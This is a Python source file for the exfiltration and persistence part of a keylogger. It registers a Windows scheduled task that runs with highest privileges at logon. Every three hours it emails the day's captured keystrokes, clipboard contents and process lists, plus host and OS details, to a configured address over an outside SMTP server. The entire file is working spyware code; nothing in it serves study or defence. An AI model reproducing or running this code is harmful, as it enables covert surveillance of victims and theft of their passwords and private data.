from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from config import *
import socket
import platform
import smtplib
import os
import datetime
import time
import schedule

hostname = socket.gethostname()
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
os_info = platform.platform()


def send_email(to_addr, message, subject, attachment_paths=None):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = to_addr
    msg['Subject'] = subject

    # Add system information to the message body
    message += f"\n\nHostname: {hostname}\nCurrent Time: {current_time}\nOperating System: {os_info}"
    msg.attach(MIMEText(message, 'plain'))

    if attachment_paths:
        for attachment_path in attachment_paths:
            if os.path.exists(attachment_path):
                attachment = open(attachment_path, "rb")
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                msg.attach(part)
            else:
                print(f"Warning: Attachment file {attachment_path} not found.")

    server = smtplib.SMTP_SSL('smtp.yandex.ru', 465)
    server.login(sender, password)
    server.send_message(msg)
    server.quit()


def job(message: str = "Latest online logs."):
    current_directory = os.path.dirname(os.path.abspath(__file__))
    today = datetime.datetime.now().strftime('%Y-%m-%d')

    attachments = [
        os.path.join(current_directory, f"keylog_{today}.txt"),
        os.path.join(current_directory, f"clipboard_{today}.txt"),
        os.path.join(current_directory, f"processes_{today}.txt"),
    ]

    send_email(to_addr, "Latest online logs.",
               f"KeyLogger From {hostname}", attachments)


def main():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(current_directory, "shutdown_send.py")

    command = (r'schtasks /Create /SC ONLOGON /TN "SendEmailOnShutdown" /TR "python.exe '
               rf'{path}" /RL HIGHEST')

    os.system(command)
    # Запуск задачи каждые 3 часа
    schedule.every(3).hours.do(job)

    while True:
        schedule.run_pending()
        time.sleep(1)


if __name__ == "__main__":
    main()
